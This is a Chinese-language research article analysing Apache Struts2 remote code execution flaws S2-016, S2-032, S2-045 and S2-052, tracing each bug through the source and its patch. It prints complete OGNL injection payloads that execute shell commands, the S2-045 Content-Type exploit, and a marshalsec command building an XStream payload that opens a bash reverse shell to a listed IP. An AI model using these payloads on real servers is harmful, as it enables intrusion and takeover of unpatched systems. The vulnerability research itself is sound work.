目录
--

- [前言](#preface)
- [S2-001](#s2-001)
- [S2-003](#s2-003)
- [S2-005](#s2-005)
- [S2-007](#s2-007)
- [S2-008](#s2-008)
- [S2-009](#s2-009)
- [S2-012](#s2-012)
- [S2-013](#s2-013)
- [S2-015](#s2-015)
- [S2-016](#s2-016)
- [S2-032](#s2-032)
- [S2-045](#s2-045)
- [S2-052](#s2-052)
- [S2-053](#s2-053)
- [S2-057](#s2-057)
- [S2-059](#s2-059)
- [S2-061](#s2-061)
- [小结](#summary)
- [Reference](#reference)

前言
--

尽管现在struts2用的越来越少了，但对于漏洞研究人员来说，感兴趣的是漏洞的成因和漏洞的修复方式，因此还是有很大的学习价值的。毕竟Struts2作为一个很经典的MVC框架，无论对涉及到的框架知识，还是对过去多年出现的高危漏洞的原理进行学习，都会对之后学习和审计其他同类框架很有帮助。

PS: 本系列分析的漏洞均为已公开的漏洞，Struts2官方都早已发布修复版本。建议直接使用最新版本。

S2-016
------

官方漏洞公告：<https://cwiki.apache.org/confluence/display/WW/S2-016>

影响版本：`Struts 2.0.0` - `Struts 2.3.15`

漏洞复现与分析
-------

在Struts2中，支持在`action`的请求参数中添加`redirect:`、`redirectAction:`前缀，在后面加上指定表达式，便可实现路径导航和重定向。但由于没有对前缀后面的表达式进行安全过滤，从而可导致注入任意OGNL表达式。

下面使用struts2 `2.3.15`版本自带的示例程序`struts-blank`进行调试分析。  
以`redirect:`为例，最简单的PoC`redirect:%{11+13}`，复现如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6cbae07937647f16a4f446a3272a809cb2e14d47.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6cbae07937647f16a4f446a3272a809cb2e14d47.png)

可以看到表达式`%{11+13}`被执行了，结果回显在了响应头`Location`中。

对这些参数前缀的处理，是在`org.apache.struts2.dispatcher.mapper.DefaultActionMapper`类中，如下图，每个前缀都有与之对应的处理动作。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d3c596f3419ca2a6885ddd2e3bab09166841603f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d3c596f3419ca2a6885ddd2e3bab09166841603f.png)

下面以`redirect:`前缀为例子。

先说一下，这个漏洞的触发流程其实是在struts2运行主线的第一阶段，并没有到达第二阶段。什么意思呢，看下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b1f838d5911d37c6876ee7abfb9f790161728061.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b1f838d5911d37c6876ee7abfb9f790161728061.png)

如上图，这是一个正常的`action`请求的处理时序图。

首先第一阶段是对HTTP请求的预处理阶段。这个阶段主要由Struts2完成，其主要职责是与Web容器打交道，将HTTP请求处理成为普通的Java对象。&lt;br&gt;  
而第二阶段，则是XWork事件处理阶段。程序的执行控制权在此时交给了XWork框架，其主要职责是对请求进行核心逻辑处理。

为什么说这个漏洞的触发流程只是在struts2运行主线的第一阶段呢？来实际调试一下便知。

struts2接收到请求后，先到达`StrutsPrepareAndExecuteFilter#doFilter()`方法中，在该方法中，会根据`request`对象来获取`ActionMapping`对象，如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ef6bfa466a4a7507e2819fed2eec58dabd7e7033.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ef6bfa466a4a7507e2819fed2eec58dabd7e7033.png)

在获取`ActionMapping`对象的过程中，会调用`DefaultActionMapper#handleSpecialParameters()`方法去处理特殊的参数  
，比如包含了`redirect:`、`redirectAction:`等前缀的参数，具体的处理动作在对应的`ParameterAction#execute()`方法里完成，如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-34873641886acdae94c24388f33484bbaf7a692b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-34873641886acdae94c24388f33484bbaf7a692b.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-60e9cb7366aa8edb7b1ea701035e8a2e8d6fffda.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-60e9cb7366aa8edb7b1ea701035e8a2e8d6fffda.png)

可以看到，在`redirect:`前缀对应的处理动作中，往`ActionMapping`对象中放置了一个`Result`对象：`ServletRedirectResult`对象，并且将前缀后面的OGNL表达式字符串赋值给该`Result`对象的`location`属性中。

获取到`ActionMapping`属性后，随着运行主线的第一阶段，到达`Dispatcher#serviceAction()`方法。在该方法中，会判断在`ActionMapping`对象的`result`属性是否为`null`，如果为`null`，则进入运行主线的第二阶段。然而，前面已经在处理`redirect:`参数前缀时，将一个`ServletRedirectResult`对象赋值给了`ActionMapping`的`result`属性，所以这里不会进入第二阶段，而是直接开始调度`Result`对象。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d72342ed3d22e73159da9a03d5bc18411e271d66.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d72342ed3d22e73159da9a03d5bc18411e271d66.png)

继续跟进，看到了熟悉的`TextParseUtil.translateVariables()`方法。后面的方法执行流程就跟`S2-015:vuln-1`一样了，这里不再展开。

### 可回显PoC

```php
xxx.action?redirect:%{#context['xwork.MethodAccessor.denyMethodExecution']=false,
#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),
#f.setAccessible(true),
#f.set(#_memberAccess,true),
#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),
#wr=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),
#wr.println(#a),#wr.flush(),#wr.close()}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f96c5b6438fd54cc101454b5697e1d4c9e2231d9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f96c5b6438fd54cc101454b5697e1d4c9e2231d9.png)

漏洞修复
----

通过版本代码比对，在Struts2 `2.3.15.1`版本中，`DefaultActionMapper`类里对`redirect:`、`redirectAction:`前缀的处理代码都删除了。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fb76af995bc26bd2209436e69f9554641f527d2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fb76af995bc26bd2209436e69f9554641f527d2.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7403aa6eaf26bc6f873e7aa5c05de57b9bc1c2ef.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7403aa6eaf26bc6f873e7aa5c05de57b9bc1c2ef.png)

S2-032
------

官方漏洞公告：<https://cwiki.apache.org/confluence/display/WW/S2-032>

影响版本：`Struts 2.3.20` - `Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)`

漏洞复现与分析
-------

从漏洞公告可获悉，当Struts2的"动态方法调用"`(Dynamic Method Invocation)`特性被启用时，可通构造以`method:`为前缀的OGNL表达式，造成远程代码执行。

下面使用struts2 `2.3.28`版本自带的示例程序`struts-blank`进行调试分析。

在部署应用前，需要在`struts.xml`文件中启用`Dynamic Method Invocation`特性，同时需要将`devMode`模式关闭。至于为什么要关闭`devMode`模式，在下面的调试过程中就能找到答案。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-42bf7e7f28c7dca7452fc32c44f00b451bb56a6c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-42bf7e7f28c7dca7452fc32c44f00b451bb56a6c.png)

同`S2-016`的`redirect:`、`redirectAction:`前缀一样，对参数前缀`method:`的处理也是在类`org.apache.struts2.dispatcher.mapper.DefaultActionMapper`，如下图：

按照前面在`S2-016`漏洞分析中提到的Struts2运行主线的流程，跟进到类`DefaultActionMapper`中对参数前缀为`method:`时的处理，如下图，只有当`Dynamic Method Invocation`特性启用时才会将`method:`后面带的字符串赋值到`ActionMapping`的`method`属性。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e6091c960eae2008127d4133f26bac185950a2ed.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e6091c960eae2008127d4133f26bac185950a2ed.png)

继续跟进代码到`Dispatcher#serviceAction()`方法，发现在创建`ActionProxy`对象的过程中，会对传入的`method`字符串(即`method:`前缀后面跟着的字符串)进行HTML字符转义和JS字符转义(这个常用来防止XSS攻击)。因此这次我们构造PoC的时候就不能直接把之前漏洞的PoC拿来用了，得修改一下，比如不能出现单双引号、尖括号等。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-538f8a3ecae3182b38f7b5d43fc0a6ab932b2c80.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-538f8a3ecae3182b38f7b5d43fc0a6ab932b2c80.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3ab580219d59c6acef90e853b189e57dc8bed040.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3ab580219d59c6acef90e853b189e57dc8bed040.png)

继续跟进代码，到了调度拦截器执行阶段，当拦截器`AnnotationValidationInterceptor`执行过程中，会搜索当前`action`对象中是否有`method:`前缀后指定的方法。因为这里我们就是要插入恶意OGNL表达式的，所以结果肯定是搜索不到的。当搜索不到时，当`devMode`开启时，就会抛出异常，程序因此中断从而无法执行我们注入的OGNL表达式，所以前面提到为什么前提条件还包括不开启`devMode`模式。如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0868898ab3e0a2a0e763a767d11471fe6172001.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0868898ab3e0a2a0e763a767d11471fe6172001.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7bc42586f7e12b712171446c5fd43e6b44dc3412.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7bc42586f7e12b712171446c5fd43e6b44dc3412.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fecfc22c503b34950ab4dd0d1c55b45472ce41dc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fecfc22c503b34950ab4dd0d1c55b45472ce41dc.png)

最后，在调用`action`对象的时候，便会对`method:`前缀后面的OGNL表达式进行计算，如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-32d5da99e2199a1b575cdf2163fd146b5996b405.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-32d5da99e2199a1b575cdf2163fd146b5996b405.png)

这里要注意`OnglUtil.getValue()`的第一个参数，`methodName`后面拼接了一个圆括号`()`，故在构造PoC时，要在注入的OGNL表达式中，最后一个得是方法调用，且去掉圆括号。

### 可回显PoC

从上面的调试分析可知，会对`method:`前缀后面的字符串进行HTML字符和JS字符转义，所以这里不能使用`#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')`这种方式来访问`_memberAccess`的`allowStaticMethodAccess`属性，因为单引号会被转义。执行命令`Runtime#exec('id')`同理。

这里使用`@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`将`#_memberAccess`重置为默认对象`DefaultMemberAccess`，`DefaultMemberAccess`不会禁止执行Java静态方法。

而命令参数则利用上下文对象`context`中`parameters`属性去读取。

综上，可回显PoC如下：

```php
/xxxx.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
#res=@org.apache.struts2.ServletActionContext@getResponse(),
#w=#res.getWriter(),
#w.println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream())),
#w.flush(),
#w.close&cmd=uname -a
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eef0720ea0665a1a2cfd435230e19c0accd144a8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eef0720ea0665a1a2cfd435230e19c0accd144a8.png)

漏洞修复
----

通过版本比对，可以看到在Struts2 `2.3.28.1`版本中，对`method:`前缀后面的字符串进行了字符白名单校验，将不在白名单里的字符给去掉。新版本的关键修复代码如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9d2d53f0b3d8133ea402313fbb4c7d33637bad6b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9d2d53f0b3d8133ea402313fbb4c7d33637bad6b.png)

S2-045
------

官方漏洞公告：<https://cwiki.apache.org/confluence/display/WW/S2-045>

影响版本：`Struts 2.3.5`-`Struts 2.3.31`, `Struts 2.5`-`Struts 2.5.10`

漏洞复现与分析
-------

从漏洞公告可获悉，如果`Content-Type`请求头的值表示一个上传类型，但值是无效的，且是一个精心构造的OGNL表达式时，`Jakarta Multipart parser`这个解析器在对`Content-Type`处理的过程中，会触发异常，在处理异常信息的时候会计算OGNL表达式，从而造成远程代码执行。

这里使用Struts2 `2.3.31`版本自带的示例应用`struts-blank`进行调试分析。

因为得是上传类型，故`Content-Type`的值包含字符串`multipart/form-data`。另外，在`Jakarta Multipart parser`解析器对应的类`JakartaMultiPartRequest`的解析请求的方法`parse()`方法中下断点。

命中断点后，跟进它的处理，可以看到，当`content-type`请求头的值不是以`multipart/`开头时，则抛出异常`InvalidContentTypeException`，同时将`content-type`的值拼接到异常消息字符串中。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-40396ddaa1d8f4de4f82974f88b3687bd1b6fd55.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-40396ddaa1d8f4de4f82974f88b3687bd1b6fd55.png)

抛出异常后，则在`JakartaMultiPartRequest#buildErrorMessage()`对异常消息进行处理。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b72c4907aa0ec134199373ea9492dea6a9ab3a06.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b72c4907aa0ec134199373ea9492dea6a9ab3a06.png)

继续跟进，看到了熟悉的`TextParseUtil.translateVariables()`，往后就是从异常消息字符串中根据`%`符号提取OGNL表达式并计算求值，这里不再细说，因为前面分析其他漏洞的文章里已经详细分析过了。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-89255e1eb327cb880013162ea3501e207f725d02.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-89255e1eb327cb880013162ea3501e207f725d02.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7873c45a65b1f2510f545f52a2a48f06dcb83b13.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7873c45a65b1f2510f545f52a2a48f06dcb83b13.png)

下面重点说一下PoC的构造。

### 可回显PoC

> 注：关于OGNL表达式的形式，可参考官方文档：&lt;br&gt;  
> <https://commons.apache.org/proper/commons-ognl/language-guide.html>

因为Struts2从`2.3.28.1`版本开始，在`OgnlUtil`类中，对`(e1,e2,e3,e4,...)`这种形式的表达式进行了限制，不允许执行。`(e1,e2,e3,e4,...)`这种形式的表达式会被解析为`ASTSequence`类型，而`ASTSequence#isSequence()`永远返回`true`，从而向上抛出异常，不会继续对表达式进行求值。关键代码如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2ce61365fe04bb9517c3937394f5465d3236921c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2ce61365fe04bb9517c3937394f5465d3236921c.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-18e3de8ad5fec271be26a2ce1d0cb876b455a533.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-18e3de8ad5fec271be26a2ce1d0cb876b455a533.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3aa19ef9adf8f44b65067529c4fe8f821e585727.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3aa19ef9adf8f44b65067529c4fe8f821e585727.png)

所以这里换一种表达式形式：`(e1).(e2).(e3).(e4)....`。这种形式的表达式会被解析为`ASTChain`类型，没有被限制执行。

所以，构造简单PoC如下：

```php
%{
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#a=1).
(#b=2*#a).
(#c=2*#b).
(#ret=4*#c).
(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',#ret)).
(multipart/form-data)
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7c39694b5eb2c50ebe8841e2a4bf51822b558b69.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7c39694b5eb2c50ebe8841e2a4bf51822b558b69.png)

要构造命令执行的PoC，首先要将上下文对象`context`的`_memberAccess`属性重新赋值为`DEFAULT_MEMBER_ACCESS`。但Struts2 `2.3.31`的代码里，上下文对象`context`内部的`Map`集合已经没有`_memberAccess`这个键，当然也就无法向之前一样通过`#context['_memberAccess']`或`#_memberAccess`去访问`context`的`_memeberAccess`属性。(详见`OgnlContext`的`static`代码块和`get(Object key)`方法)

但可以通过`OgnlContext`的`setMemberAccess()`方法去设置它。然而在此之前，还得做些工作。否则`OgnlContext#setMemberAccess()`无法执行。为什么呢？这里直接拿网上的漏洞利用工具/脚本里的`S2-045`漏洞exploit来解释，如下:

```php
%{
(#t='multipart/form-data').
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess?(#_memberAccess=#dm):
        (
        (#container=#context['com.opensymphony.xwork2.ActionContext.container']).
        (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
        (#ognlUtil.getExcludedPackageNames().clear()).
        (#ognlUtil.getExcludedClasses().clear()).
        (#context.setMemberAccess(#dm)))).
(#cmd='id').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
(#p=new java.lang.ProcessBuilder(#cmds)).
(#p.redirectErrorStream(true)).
(#process=#p.start()).
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
(#ros.flush())
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d5f6982b94280d0753d1672adc2807d9bef5fedc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d5f6982b94280d0753d1672adc2807d9bef5fedc.png)

- 因为版本较旧的Struts2，上下文对象`context`内部的`Map`集合里还是存在`_memberAccess`属性的，同时也可以通过`get`方法访问，而版本较新的则没有。所以这里使用条件形式的表达式`(e1)?(e2):(e3)`来实现版本的兼容。
- 这里在执行`#context.setMemberAccess()`前，为什么要先调用`#ognlUtil.getExcludedPackageNames().clear()`和`#ognlUtil.getExcludedClasses().clear()`呢？原因是在较新的Struts2版本中，默认情况下，会通过类名和包名黑名单的形式禁止OGNL表达式中某些类的方法调用。Struts2 `2.3.31`里的类名、包名的黑名单如下图所示。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-14da70c340c5157d6a0b024d9159e4522ca914f2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-14da70c340c5157d6a0b024d9159e4522ca914f2.png)

对黑名单的读取，是在`OgnlValueStack#setOgnlUtil()`方法中，如下图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bef0e6f899db090ff34b555b889789921b34b05f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bef0e6f899db090ff34b555b889789921b34b05f.png)

可以看到，连`OgnlContext`都在黑名单中，所以必须得先将黑名单集合`excludedClasses`和`excludedPackageNames`给清空，同时又不能使用黑名单里的类去调用方法。故这个exploit给了一个思路：

先通过`#container=#context['com.opensymphony.xwork2.ActionContext.container']`来获取`ContainerImpl`对象，通过`ContainerImpl#getInstance()`方法来获取`OgnlUtil`对象，而`OgnlUtil`并不在黑名单中，所以再通过`#ognlUtil.getExcludedPackageNames().clear()`和`#ognlUtil.getExcludedClasses().clear()`来清空存储黑名单的集合。清除后，上下文对象`context`就可以调用`setMemberAccess()`方法去重置`_memberAccess`属性了。

漏洞修复
----

在Struts2 `2.3.32`中，`JakartaMultiPartRequest#buildErrorMessage()`把异常信息传入了`LocalizedTextUtil#findText()`方法的`args`参数的位置，不再传到`defaultMessage`参数的位置。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf2c6da4e99457272db91f6051ec3a9064ded1fc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf2c6da4e99457272db91f6051ec3a9064ded1fc.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0d055801a9ac497b53a132482732dc12c80188f3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0d055801a9ac497b53a132482732dc12c80188f3.png)

S2-052
------

官方漏洞公告：<https://cwiki.apache.org/confluence/display/WW/S2-052>

影响版本：`Struts 2.1.6` - `Struts 2.3.33`, `Struts 2.5` - `Struts 2.5.12`

漏洞复现与分析
-------

下面使用Struts2 `2.3.33`版本自带的示例应用`struts2-rest-showcase`进行调试分析。

从漏洞公告可获悉，该漏洞与OGNL表达式无关，而是由于`REST plugin`插件在处理`xml`类型的请求数据时，没有进行任何类型的过滤，故可构造恶意xml数据使XStream进行不安全的反序列化，从而达到RCE。

`struts2-rest-plugin`是使Struts2实现REST API的插件。它通过`Content-Type`或`URI后缀名`来识别不同的请求数据类型，然后根据请求数据类型用不同的实现类去处理。关键代码如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6d26d0194fe924e70b77929452c1a9ec81862280.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6d26d0194fe924e70b77929452c1a9ec81862280.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-649713fdca933a2ece4f807b0a26ef6913cb0c6d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-649713fdca933a2ece4f807b0a26ef6913cb0c6d.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-54fbf3b330beeefc7eaf19ab663003c811a49483.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-54fbf3b330beeefc7eaf19ab663003c811a49483.png)

跟进`XStreamHandler#toObject()`方法，发现调用了`XStream#fromXML()`方法对请求数据进行反序列化。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-07cedaa5e21169e9088cd9f6e9b6c5b19a15cd81.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-07cedaa5e21169e9088cd9f6e9b6c5b19a15cd81.png)

`struts-rest-plugin-2.3.33`依赖的XStream的版本是`1.4.8`。故可以使用`marshalsec`生成`ImageIO`利用链的payload进行RCE的漏洞利用。

可回显PoC
------

对于xstream的反序列化命令执行回显，本人暂时不知道如何实现。&lt;br&gt;  
下面使用`marshalsec`工具生成反弹shell的exploit：

```php
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO "/bin/bash" "-c" "bash -i >& /dev/tcp/192.168.166.233/443 0>&1"
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-51ac1e9cb55bd7f82357867a0ad6a024d7d7c1c9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-51ac1e9cb55bd7f82357867a0ad6a024d7d7c1c9.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0f16081a94092ceb2b9c6c8b5c1f47805a5aad2d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0f16081a94092ceb2b9c6c8b5c1f47805a5aad2d.png)

漏洞修复
----

在`struts2-rest-plugin-2.3.34`版本中，将XStream升级到了`1.4.10`版本，且按照XStream官方的推荐(hxxps://x-stream.github.io/security.html)，使用了白名单的方式指定可以反序列化的类型。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-380048a0e4f11ded447a0c029df522d73a2c08a1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-380048a0e4f11ded447a0c029df522d73a2c08a1.png)